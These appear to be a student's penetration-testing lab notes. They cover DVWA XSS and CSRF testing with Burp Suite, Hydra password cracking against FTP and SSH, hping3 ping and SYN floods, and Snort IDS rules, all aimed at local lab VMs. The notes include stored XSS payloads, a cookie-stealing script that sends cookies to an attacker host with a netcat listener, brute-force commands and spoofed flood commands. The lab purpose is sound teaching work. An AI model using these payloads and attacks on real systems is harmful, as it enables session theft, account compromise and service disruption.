# VAPT

videos link https://drive.google.com/drive/u/1/folders/1L9Eg45D2zRLi1t23e6L9IqLrYPtG5L6B

VAPT Lab Experiments 5 to 8
Experiment 5: Burp Suite - XSS and CSRF Testing
As a cybersecurity analyst evaluating the security of a new online education platform, this experiment demonstrates how to identify XSS and CSRF vulnerabilities using Burp Suite.

Setup: Burp Suite Configuration
1. Launch Burp Suite in Kali Linux.
2. Configure browser proxy: HTTP proxy to 127.0.0.1:8080.
3. Import Burp Suite certificate into the browser.
4. Start Kali Linux and Metasploitable 2 VMs.
5. Access the application via 192.168.111.129 in browser.
6. Open DVWA and login using: admin / password.

a) XSS (Cross-Site Scripting)

Stored XSS
Stored XSS executes malicious scripts stored permanently on a page, running on every visit.
1. Navigate to XSS (Stored).
2. Test 1: Name: Test, Message: <b>Hello Everyone</b> → Click "Sign Guestbook"
3. Test 2: Name: Hi, Message: <script>alert("Hello This is XSS")</script> → Sign Guestbook
4. Navigate away and return to the page to see the popup.
5. To fetch cookies: <script>alert(document.cookie)</script>
6. For stealing cookies:
<script>new Image().src="http://192.168.62.128/abc.php?output="+document.cookie;</script>
   - Start listener: nc -lvp 80

Reflected XSS
1. Navigate to XSS (Reflected).
2. Enter: <script>alert("hello")</script> and submit.
3. Alert box appears, but disappears on refresh/navigation.

b) CSRF (Cross-Site Request Forgery)
1. Log in to DVWA as admin / password.
2. Set DVWA security to Low.
3. Open Burp Suite and ensure proxy setup and certificate are configured.
4. Navigate to CSRF page.
5. Enter new password and confirmation.
6. Activate Intercept in Burp Suite.
7. Submit form → Burp captures traffic.
8. Send to Repeater and then Forward the intercepted request.
9. Check for "Password Changed" in DVWA.
10. Modify password in Repeater, send again.
11. Confirm password changed again via Render tab.
12. Disable intercept and proxy settings.
13. Log out and try to log in again. Original password fails due to unauthorized change.

Experiment 6: Password Strength Assessment using Hydra
ABC Corp uses Hydra to perform a dictionary-based password cracking attack targeting FTP and SSH services.

Steps:
1. Start Kali Linux and Metasploitable2 VMs.
2. Locate dictionary file: locate unix_passwords.txt
3. If msfadmin is not in the file:
   vi /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt
4. Run Hydra against FTP:
   hydra -l msfadmin -P /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt ftp://192.168.62.137
5. If password match is found, connect via FTP:
   ftp 192.168.62.137
6. SSH into target:
   ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.62.137
   echo "Welcome to Cyber Security Lab" > 1.txt
   cat 1.txt

Experiment 7: DoS Attack Simulation using Hping3
Using Hping3, simulate SYN and Ping flood attacks and observe the impact.

Ping Flood:
1. Start Kali Linux and Ubuntu VM (target).
2. ping 192.168.62.133
3. Use Wireshark to capture ICMP packets.
4. Install Snort on Ubuntu:
   sudo apt-get install snort -y
   sudo snort -A console -c /etc/snort/snort.conf
5. Launch Ping Flood from Kali:
   sudo hping3 -1 -c 1 192.168.62.133
   sudo hping3 -1 -c 1 -i 5 192.168.62.133
   sudo hping3 -1 --faster 192.168.62.133
   sudo hping3 -1 -a 192.168.62.139 192.168.62.133
   sudo hping3 -1 --rand-source 192.168.62.133

SYN Flood:
1. Start Kali Linux and Metasploitable2 VMs.
2. Access DVWA from Kali browser.
3. Run SYN Flood:
   sudo hping3 -S -c 1 -p 80 192.168.62.129
   sudo hping3 -S -c 1 -p 80 -i 5 192.168.62.129
   sudo hping3 -S --flood -p 80 192.168.62.129

Experiment 8: Implementing IDS with Snort
Steps to configure and test Snort as an IDS:

1. Start Ubuntu and Kali Linux VMs.
2. Install Snort on Ubuntu:
   sudo apt-get install snort
3. Configure network interface during setup.
4. Edit Snort config and rules:
   cd /etc/snort
   sudo vi snort.conf
   cd rules
   vi local.rules

5. Test and start Snort:
   sudo snort -T -c /etc/snort/snort.conf
   sudo snort -A console -c /etc/snort/snort.conf

Testing with Kali:
1. nmap 192.168.111.133
2. ping 192.168.111.133

Custom Snort Rules (in local.rules):
alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"Shubha"; sid:5889; rev:1;)
alert tcp any any -> $HOME_NET 21 (msg:"FTP attempted"; sid:60001; rev:1;)
alert tcp any any -> $HOME_NET 22 (msg:"SSH attempted"; sid:600022; rev:1;)

Trigger Rules:
1. ping 192.168.111.133 → Shubha alert
2. ftp 192.168.111.133 → FTP attempted alert
3. ssh ubuntu@192.168.111.133 → SSH attempted alert
